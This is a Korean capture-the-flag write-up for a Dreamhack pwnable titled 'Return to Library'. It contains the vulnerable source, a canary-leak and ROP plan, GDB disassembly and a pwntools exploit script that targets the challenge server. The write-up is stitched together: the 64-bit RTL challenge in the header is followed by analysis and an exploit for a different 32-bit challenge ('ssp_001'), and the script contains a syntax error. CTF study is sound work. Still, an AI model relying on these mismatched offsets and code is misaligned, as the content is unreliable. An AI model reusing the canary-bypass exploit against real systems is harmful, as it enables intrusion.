# 🚩 [Return to Library]

> **Category:** Pwnable  
> **Difficulty:** <span style="color: #CD7F32; font-weight: bold;">B1</span>  
> **Flag:** `DH{--}`  

---

## 📄 1. Challenge Description
* **Environment :**
  ```text
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
* **Reference :**
  ```text
    Return to Library
---

## 🔍 2. Vulnerability Analysis

이 문제는 **Stack Smashing Protector(Canary)**가 적용되어 있고 NX기법이 적용되어 있어 단순 BOF로 `RET`를 덮어쓰면 NX로 인해 프로그램이 터집니다. 따라서 **1) Canary Leak** 후 **2) Return to Library**를 수행해야 합니다.

### Code Review & Vulnerable Points
C 언어 의사 코드(Decompiled Code) 및 핵심 메뉴 기능 분석:

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
## 🗡️ 3. Exploit Scenario (공격 시나리오)

1. **`Leak Canary` 부분 사용:**
   * `Buf`를 이용해 Canary의 \x00부분까지 덮습니다.
   * `printf`의 `%s`(\x00까지 프린트 해줌)를 이용하여 canary값을 불러옵니다.

2. **`Overwrite return address` 부분 사용:**
   * 
   * `Payload = Dummy + Canary + Dummy + pop_rdi + /bin/sh + ret + system@plt` 형태로 페이로드를 구성하여 전송합니다.

3. **Shell 획득 및 Flag 획득**

---


## 🕵️‍♀️ 4. Appendix: GDB Disassembly & Analysis (GDB 분석)

### 1. Stack Canary Storage
함수 시작 부분에서 `%gs:0x14`로부터 Canary 값을 가져와 스택에 저장하는 어셈블리 코드입니다.

```assembly
0x0804873e <+19>:    mov    %gs:0x14,%eax
0x08048744 <+25>:    mov    %eax,-0x8(%ebp)
```

* **Canary Location:** `ebp - 0x8` (Decimal: `ebp - 8`)

---

### 2. Buffer & Canary Offset Calculation

사용자 입력을 받는 버퍼(`box`)의 주소와 Canary 위치 차이를 이용해 Offset을 계산합니다.

```assembly
; Buffer (`box`) 시작 위치 확인 (예시)
   0x080487d0 <+165>:   add    $0x4,%esp
   0x080487d3 <+168>:   push   $0x40
   0x080487d5 <+170>:   lea    -0x88(%ebp),%eax
   0x080487db <+176>:   push   %eax
   0x080487dc <+177>:   push   $0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
```

#### Offset 계산식
* **Buffer 주소:** `ebp - 0x88` (Decimal: 136)
* **Canary 주소:** `ebp - 0x8` (Decimal: 8)
* **Offset:** $136 - 8 = \mathbf{128 \text{ bytes}}$

> **결론:** `box` 배열 시작점으로부터 **128바이트** 떨어진 지점에 Canary가 위치합니다.

---

## 💥 5. Exploit Script (`ex.py`)

```python
from pwn import *

#p = process("./ssp_001")
p=remote("host3.dreamhack.games",18707)
#print(f"PID : {p.pid}")
canary = b"\x00"
get_shell = 0x80486b9

for i in range(129,132,1): //box에서 canary까지 index
    p.sendafter(b"> ",b"P")
    p.sendlineafter(b"Element index : ", str(i).encode())
    p.recvuntil(b"is : ")
    a = p.recv(2)
    canary += unhex(a) # 예) "08" -> b"\x08" 

canary = u32(canary)  # 예) b"\x08" -> 0x08
p.sendafter(b"> ",b"E")
p.sendlineafter(b"Name Size : ", b"90")

payload = b"a" * 64                
payload += p32(canary) # 예) 0x08 -> b"\x08"           
payload += b"a" * 8
payload += p32(get_shell)


p.sendafter(b"Name : ", payload)

p.interactive()
```
---




## 💡 6. Code Analysis & Deep Dive (주요 포인트 분석)

* **Canary Leak (OOB 이용):**
  * `box` 배열 시작점부터 Canary까지의 오프셋이 `128`부터 시작하며, 4바이트(`128`, `129`, `130`, `131` 인덱스)에 걸쳐 존재합니다.
  * 32비트 시스템의 Canary 첫 번째 바이트는 항상 `\x00` (Null Byte)이므로, `canary = b"\x00"`으로 시작한 뒤 나머지 3바이트를 16진수 문자열로 수신받아 `unhex()` 후 병합하였습니다.
* **Payload Structure:**
  * `Dummy (64 bytes)` + `Canary (4 bytes)` + `Dummy/SFP (8 bytes)` + `RET (4 bytes)`
  * 정확하게 수집한 Canary 값을 덮어씌움으로써 `Stack Smashing Detected` 에러 방지 메커니즘을 성공적으로 우회하였습니다.

---

## 🎓 7. Retrospective / Takeaways (요약 및 느낀 점)

* 32비트 환경에서의 Stack Canary Structure 및 Little-Endian 변환 과정(`p32`/`u32`)을 재점검할 수 있었습니다.
* pwntools의 `unhex()` 기능을 활용해 16진수 텍스트 데이터를 효율적으로 바이트 데이터로 변환하는 방법을 익혔습니다.
